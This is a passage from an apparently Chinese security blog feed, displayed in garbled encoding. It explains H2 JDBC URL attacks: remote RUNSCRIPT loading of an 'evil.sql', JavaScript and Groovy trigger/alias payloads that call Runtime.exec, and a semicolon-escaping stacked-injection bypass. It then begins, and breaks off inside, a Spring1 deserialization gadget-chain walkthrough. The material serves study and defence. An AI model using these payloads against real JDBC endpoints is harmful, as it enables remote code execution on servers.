¹æœ¬æ²¡åˆ›å»ºæˆåŠŸ)</p><p>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºè¿™æ®µjsä»£ç æœ¬æ„æ˜¯ç”¨æ¥è¿”å›ä¸€ä¸ª<code>Trigger</code>å¯¹è±¡çš„</p><p>æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£<a href="https://www.h2database.com/html/commands.html#create_trigger">https://www.h2database.com/html/commands.html#create_trigger</a></p><blockquote><p>The trigger class must be public and implement <code>org.h2.api.Trigger</code>. Inner classes are not supported. The class must be available in the classpath of the database engine (when using the server mode, it must be in the classpath of the server).</p><p>The sourceCodeString must define a single method with no parameters that returns <code>org.h2.api.Trigger</code>. See <code>CREATE ALIAS</code> for requirements regarding the compilation. Alternatively, javax.script.ScriptEngineManager can be used to create an instance of <code>org.h2.api.Trigger</code>. Currently javascript (included in every <code>JRE</code>) and ruby (with <code>JRuby</code>) are supported. In that case the source must begin respectively with <code>//javascript</code> or <code>#ruby</code>.</p><p>Example:</p><p>CREATE TRIGGER TRIG_INS BEFORE INSERT ON TEST FOR EACH ROW CALL â€˜MyTriggerâ€™;</p><p>CREATE TRIGGER TRIG_SRC BEFORE INSERT ON TEST AS â€˜org.h2.api.Trigger create() { return new MyTrigger(â€œconstructorParamâ€); }â€™;</p><p>CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS â€˜&#x2F;&#x2F;javascript return new Packages.MyTrigger(â€œconstructorParamâ€);â€™;</p><p>CREATE TRIGGER TRIG_RUBY BEFORE INSERT ON TEST AS â€˜#ruby Java::MyPackage::MyTrigger.new(â€œconstructorParamâ€)â€™;</p></blockquote><p>å¯ä»¥ç”¨<code>javax.script.ScriptEngineManager</code>æ¥åˆ›å»ºä¸€ä¸ª<code>org.h2.api.Trigger</code>å®ä¾‹</p><p><code>org.h2.schema.TriggerObject#loadFromSource</code></p><p><img src="/2024/08/13/JDBC/image-20240813181204143.png" alt="image-20240813181204143"></p><p>åˆ¤æ–­æ˜¯å¦ä¸ºjsæˆ–rubyè„šæœ¬</p><p><img src="/2024/08/13/JDBC/image-20240813181216278.png" alt="image-20240813181216278"></p><p>ç®€å•åˆ¤æ–­æ˜¯å¦ä»¥<code>//javascript</code>å¼€å¤´</p><p><img src="/2024/08/13/JDBC/image-20240813181226959.png" alt="image-20240813181226959"></p><p>ç„¶åå°±æ˜¯ç»å…¸çš„<code>new ScriptEngineManager().getEngineByName(&quot;javascript&quot;)</code></p><p><img src="/2024/08/13/JDBC/image-20240813181240153.png" alt="image-20240813181240153"></p><p>è¿”å›<code>CompiledScript</code>è°ƒç”¨å…¶<code>eval</code></p><p>ä½ç‰ˆæœ¬H2(1.4.200ä¹‹å‰)è²Œä¼¼ä¸æ”¯æŒjsè„šæœ¬ï¼Œæ²¡æœ‰<code>isJavascriptSource</code>è¿™æ®µä»£ç ã€‚</p><h4 id="å‡ºç½‘åˆ©ç”¨â€”â€”init-runscript"><a href="#å‡ºç½‘åˆ©ç”¨â€”â€”init-runscript" class="headerlink" title="å‡ºç½‘åˆ©ç”¨â€”â€”init+runscript"></a>å‡ºç½‘åˆ©ç”¨â€”â€”init+runscript</h4><p>ä¸Šé¢è¿™äº›æ“ä½œçš„åˆ©ç”¨å‰æéƒ½æ˜¯h2 consoleæˆåŠŸè¿æ¥åˆ°æ•°æ®åº“ã€‚</p><p>ä½ç‰ˆæœ¬H2(<code>1.4.193</code>å·¦å³)å½“è¿æ¥çš„æ•°æ®åº“ä¸å­˜åœ¨æ—¶ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œä½†é«˜ç‰ˆæœ¬å°±ä¸è¡Œäº†</p><p>ä¼šæŠ¥é”™<code>Database &quot;mem:test&quot; not found.either pre-create it or allow remote database creation</code></p><p>è¦ä¹ˆè¿æ¥Springbootä¸­<code>spring.datasource.url</code>æŒ‡æ˜çš„æ•°æ®åº“ï¼Œè¦ä¹ˆéœ€è¦å¯åŠ¨consoleæ—¶å¸¦ä¸Š<code>-ifNotExists</code>å‚æ•°</p><p>å› æ­¤èƒ½å¦ä¸è¿æ¥è¿›å»å°±èƒ½æ‰§è¡Œå‘½ä»¤å‘¢?</p><p>h2æ•°æ®åº“çš„JDBC URLä¸­æ”¯æŒçš„ä¸€ä¸ªé…ç½®<code>INIT</code></p><p>è¿™ä¸ªå‚æ•°è¡¨ç¤ºåœ¨è¿æ¥h2æ•°æ®åº“æ—¶ï¼Œä¼šæ‰§è¡Œä¸€æ¡åˆå§‹åŒ–å‘½ä»¤ã€‚ä¸è¿‡åªæ”¯æŒæ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œè€Œä¸”ä¸èƒ½åŒ…å«åˆ†å·<code>;</code></p><p>ä¸Šé¢<code>CREATE ALIAS</code>ç”¨äºå‘½ä»¤æ‰§è¡Œçš„SQLè¯­å¥éƒ½ä¸æ­¢ä¸€æ¡ã€‚å¯ä»¥åˆ©ç”¨<code>RUNSCRIPT</code>å‘½ä»¤ã€‚<code>RUNSCRIPT</code>ç”¨äºæ‰§è¡Œä¸€ä¸ªSQLæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;INIT=RUNSCRIPT FROM <span class="hljs-string">&#x27;http://127.0.0.1:8888/evil.sql&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•èƒ½ç”¨åœ¨ä»»ä½•èƒ½é…ç½®JDBC URLä¸”ä¾èµ–äº†H2çš„åœ°æ–¹</p><p><img src="/2024/08/13/JDBC/image-20240813181326106.png" alt="image-20240813181326106"></p><p>ç„¶åå°±å¯ä»¥URLè¿œç¨‹åŠ è½½æ¶æ„ç±»äº†ã€‚</p><h4 id="ä¸å‡ºç½‘åˆ©ç”¨â€”â€”init-groovy"><a href="#ä¸å‡ºç½‘åˆ©ç”¨â€”â€”init-groovy" class="headerlink" title="ä¸å‡ºç½‘åˆ©ç”¨â€”â€”init+groovy"></a>ä¸å‡ºç½‘åˆ©ç”¨â€”â€”init+groovy</h4><p>JDBCè¿æ¥æ—¶<code>INIT</code>åªå…è®¸æ‰§è¡Œä¸€æ¡SQLå‘½ä»¤ï¼Œè€Œæˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œæœ‰ä¸¤å¥ï¼Œä¸€å¥åˆ›å»ºUDFï¼Œä¸€å¥æ‰§è¡ŒUDF</p><p>é™¤éæœ‰å·²çŸ¥è¡¨ï¼Œä½¿ç”¨<code>CREATE TRIGGER</code>å°±åªéœ€ä¸€å¥ã€‚å®é™…ä¸Šå¯ä»¥åˆ©ç”¨H2çš„ç³»ç»Ÿè¡¨ï¼ŒH2å’ŒMySQLä¸€æ ·ä¹Ÿæœ‰<code>INFORMATION_SCHEMA</code></p><blockquote><p>The system tables and views in the schema <code>INFORMATION_SCHEMA</code> contain the meta data of all tables, views, domains, and other objects in the database as well as the current settings.</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS <span class="hljs-string">&#x27;//javascript</span><br><span class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒH2æå–URLä¸­çš„é…ç½®æ—¶æ˜¯é€šè¿‡åˆ†å‰²åˆ†å·<code>;</code>æ¥æå–çš„ï¼Œå› æ­¤JSä»£ç ä¸­ä¸èƒ½æœ‰åˆ†å·ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼ˆå¯ä»¥åŠ ä¸Šåæ–œæ ä»£è¡¨è½¬ä¹‰ï¼‰</p><p><img src="/2024/08/13/JDBC/image-20240813181406492.png" alt="image-20240813181406492"></p><p>è‹¥ç›®æ ‡ç¯å¢ƒæœ‰<code>Groovy</code>ä¾èµ–ï¼Œå¯ä»¥ä½¿ç”¨å…ƒç¼–ç¨‹çš„æŠ€å·§æ¥å‘½ä»¤æ‰§è¡Œï¼Œåœ¨ç¼–è¯‘<code>Groovy</code>è¯­å¥è€Œéæ‰§è¡Œæ—¶å°±æ‰§è¡Œæ”»å‡»è€…çš„ä»£ç ã€‚</p><p>æ·»åŠ <code>groovy-sql</code>ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy-sql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;init=CREATE ALIAS shell2 AS<br>$$<span class="hljs-meta">@groovy</span>.transform.ASTTest(value=&#123;<br><span class="hljs-keyword">assert</span> java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span>)<br>&#125;)<br>def x$$<br></code></pre></td></tr></table></figure><h4 id="SQLI-2-RCE"><a href="#SQLI-2-RCE" class="headerlink" title="SQLI 2 RCE"></a>SQLI 2 RCE</h4><p>å¯è§<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18015760">HGAME week2-web wp - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a>çš„SearchVmenberé‚£é“é¢˜ã€‚</p><p><code>INIT</code>å‚æ•°å¯ä»¥ç›´æ¥åœ¨è¿æ¥æ•°æ®åº“æ—¶æ‰§è¡Œåˆå§‹åŒ–çš„sqlè¯­å¥</p><p>é™¤äº†<code>INIT</code>å‚æ•°ï¼Œä¸€äº›å‚æ•°åœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šæ‰§è¡ŒSETå‘½ä»¤ï¼Œå­˜åœ¨SQLæ³¨å…¥</p><p>æ¯”å¦‚<code>TRACE_LEVEL_SYSTEM_OUT</code>ã€<code>TRACE_MAX_FILE_SIZE</code>â€¦â€¦</p><p><img src="/2024/08/13/JDBC/image-20240813181531078.png" alt="image-20240813181531078"></p><p><code>org.h2.engine.Engine#openSession</code>ä¼šå¯¹æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°è¿›è¡Œ<code>SET</code>è¯­å¥æ‹¼æ¥</p><p><img src="/2024/08/13/JDBC/image-20240813181544236.png" alt="image-20240813181544236"></p><p>å¼€å§‹å°è¯•å †å æ³¨å…¥</p><h4 id="å‘ï¼šsemicolonåˆ†å‰²ä¹‹ç—›"><a href="#å‘ï¼šsemicolonåˆ†å‰²ä¹‹ç—›" class="headerlink" title="å‘ï¼šsemicolonåˆ†å‰²ä¹‹ç—›"></a>å‘ï¼šsemicolonåˆ†å‰²ä¹‹ç—›</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">3</span>;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$<span class="hljs-comment">//javascript</span><br>Java.type(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)$$--<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªpayloadå¹¶ä¸èƒ½æ‰“é€šï¼Œè¿˜å¾—çœ‹å®ƒæ˜¯æ€ä¹ˆæå–settingå‚æ•°çš„</p><p><code>org.h2.engine.ConnectionInfo#readSettingsFromURL</code> è¿™ä¸ªç±»ç”¨äºå­˜å‚¨è¿æ¥ä¿¡æ¯</p><p><img src="/2024/08/13/JDBC/image-20240813181602835.png" alt="image-20240813181602835"></p><p>é—®é¢˜å°±å‡ºåœ¨è¿™ï¼Œæˆ‘ä»¬ç”¨äºå †å æ³¨å…¥çš„åˆ†å·<code>;</code>ï¼ŒåŒæ—¶ä¹Ÿæ˜¯H2ç”¨æ¥æå–è®¾ç½®å‚æ•°çš„åˆ†éš”ç¬¦ã€‚ã€‚ã€‚ğŸ¥²</p><p>ä½†è¦æ˜¯settingsçš„å€¼æœ¬æ¥å°±å­˜åœ¨åˆ†å·æ€ä¹ˆåŠï¼Œç…§ç†æ˜¯ä¼šæä¾›è½¬ä¹‰çš„ï¼Œè·Ÿè¿›<code>StringUtils.arraySplit</code>ä¸€æ¢ç©¶ç«Ÿ</p><p><img src="/2024/08/13/JDBC/image-20240813181626818.png" alt="image-20240813181626818"></p><p>æœç„¶æ˜¯æ”¯æŒåæ–œæ è½¬ä¹‰çš„ã€‚å› æ­¤åœ¨payloadä¸­åˆ†å·å‰é¢åŠ ä¸Š<code>\</code>å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">1</span>\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$<span class="hljs-comment">//javascript</span><br>Java.type(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)$$--<br></code></pre></td></tr></table></figure><h3 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h3><p>åŸºæœ¬çº¯æŠ„çš„ï¼Œå› ä¸ºåˆ†æèµ·æ¥å¤ªè´¹åŠ²äº†ï¼Œå°¤å…¶æ˜¯é…ç¯å¢ƒä¹‹ç±»çš„â€¦ä»¥å‰çš„ç¯å¢ƒæ‰¾ä¸åˆ°äº†å°±åˆå·ä¸ªæ‡’ã€‚</p><p>è¿™é‡Œç®€å•ä»‹ç»äº†H2çš„JDBCæ”»å‡»æ–¹æ³•ï¼Œåœ¨JDBC URLå¯æ§çš„æƒ…å†µä¸‹ï¼ˆä¸å±€é™äºh2 web consoleï¼‰</p><ul><li>JNDIæ³¨å…¥ï¼ˆé«˜ç‰ˆæœ¬é™åˆ¶äº†åªèƒ½æ˜¯javaåè®®ï¼‰</li><li>åˆ©ç”¨initå‚æ•°æ‰§è¡Œ<code>RUNSCRIPT</code>å‘½ä»¤åŠ è½½æ‰§è¡Œè¿œç¨‹æ¶æ„SQL</li><li>åˆ©ç”¨initå‚æ•°ç›´æ¥æ‰§è¡Œ<code>groovy</code>å…ƒç¼–ç¨‹ä»£ç ï¼ˆä¸å‡ºç½‘ï¼‰</li><li>åˆ©ç”¨å…¶ä»–è¿æ¥å‚æ•°è¿›è¡Œå †å æ³¨å…¥</li></ul><p>å½“ç„¶è‹¥èƒ½ç›´æ¥è¿æ¥ä¸Šå»ï¼Œå°±èƒ½ç›´æ¥UDFå‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>è€Œå¯¹äºh2 web consoleï¼Œåˆ©ç”¨æ–¹å¼ä¼šå—åˆ°ä¸€äº›é™åˆ¶ï¼š</p><ul><li>éœ€è¦å¼€å¯<code>-webAllowOthers</code>é€‰é¡¹ï¼Œæ”¯æŒå¤–éƒ¨è¿æ¥</li><li>éœ€è¦å¼€å¯<code>-ifNotExists</code>é€‰é¡¹ï¼Œæ”¯æŒåˆ›å»ºæ•°æ®åº“</li></ul><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/jdbc-attack/h2#springboot-zheng-he">H2 JDBC Attack | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring</title>
    <link href="/2024/08/12/Spring/"/>
    <url>/2024/08/12/Spring/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ²¡å•¥å¥½è¯´çš„ï¼Œçœ‹çœ‹å§ã€‚</p><h2 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-beans<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="MethodInvokeTypeProvider"><a href="#MethodInvokeTypeProvider" class="headerlink" title="MethodInvokeTypeProvider"></a>MethodInvokeTypeProvider</h3><p>åˆ‡å…¥ç‚¹åœ¨ <code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodInvokeTypeProvider</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TypeProvider</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> TypeProvider provider;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String methodName;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> index;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Object result;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MethodInvokeTypeProvider</span><span class="hljs-params">(TypeProvider provider, Method method, <span class="hljs-type">int</span> index)</span> &#123;<br>        <span class="hljs-built_in">this</span>.provider = provider;<br>        <span class="hljs-built_in">this</span>.methodName = method.getName();<br>        <span class="hljs-built_in">this</span>.index = index;<br>        <span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, provider.getType());<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        inputStream.defaultReadObject();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);<br>        <span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>readObject</code>ä¼šè°ƒç”¨<code>this.provider.getType()</code>è¿”å›å¯¹è±¡çš„<code>this.methodName</code>æŒ‡å®šçš„æ–¹æ³•ï¼Œè¿™é‡Œ<code>ReflectionUtils.findMethod</code>å’Œ<code>ReflectionUtils.invokeMethod</code>éƒ½æ²¡æœ‰ä¼ é€’<code>Method</code>çš„å‚æ•°ï¼Œå› æ­¤æ˜¯æ— å‚æ–¹æ³•å’Œæ— å‚è°ƒç”¨ã€‚</p><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è®©<code>this.MethodName</code>ä¸º<code>newTransformer</code>æˆ–<code>getOutputProperties</code>ï¼ˆè¿™ä¸¤ä¸ªéƒ½æ˜¯publicæ–¹æ³•ï¼Œ<code>findMethod</code>å’Œ<code>invokeMethod</code>éƒ½æ²¡æœ‰è®¾ç½®<code>Method</code>çš„å¯è®¿é—®æ€§ï¼‰ï¼Œè®©<code>this.provider.getType()</code>è¿”å›<code>TemplatesImpl</code>ã€‚</p><p>è¿™ä¸ªå¯ä»¥é€šè¿‡åŠ¨æ€ä»£ç†å®ç°ï¼Œå…ˆä»‹ç»å‡ ä¸ªè°ƒç”¨å¤„ç†å™¨ã€‚</p><h3 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h3><p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectFactoryDelegatingInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ObjectFactory&lt;?&gt; objectFactory;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectFactoryDelegatingInvocationHandler</span><span class="hljs-params">(ObjectFactory&lt;?&gt; objectFactory)</span> &#123;<br>        <span class="hljs-built_in">this</span>.objectFactory = objectFactory;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();<br>        <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;equals&quot;</span>)) &#123;<br>            <span class="hljs-comment">// Only consider equal when proxies are identical.</span><br>            <span class="hljs-keyword">return</span> (proxy == args[<span class="hljs-number">0</span>]);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) &#123;<br>            <span class="hljs-comment">// Use hashCode of proxy.</span><br>            <span class="hljs-keyword">return</span> System.identityHashCode(proxy);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;toString&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.objectFactory.toString();<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>.objectFactory.getObject(), args);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>            <span class="hljs-keyword">throw</span> ex.getTargetException();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>invokeä¸­ä¼šæŠŠæ–¹æ³•è°ƒç”¨å§”æ´¾ç»™<code>objectFactory#getObject()</code>è·å–åˆ°çš„å¯¹è±¡ã€‚</p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>è€æœ‹å‹äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br><br>    AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();<br>        <span class="hljs-keyword">if</span> (!type.isAnnotation() ||<br>            superInterfaces.length != <span class="hljs-number">1</span> ||<br>            superInterfaces[<span class="hljs-number">0</span>] != java.lang.annotation.Annotation.class)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationFormatError</span>(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.memberValues = memberValues;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>        <span class="hljs-comment">// Handle Object and Annotation methods</span><br>        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>            paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span 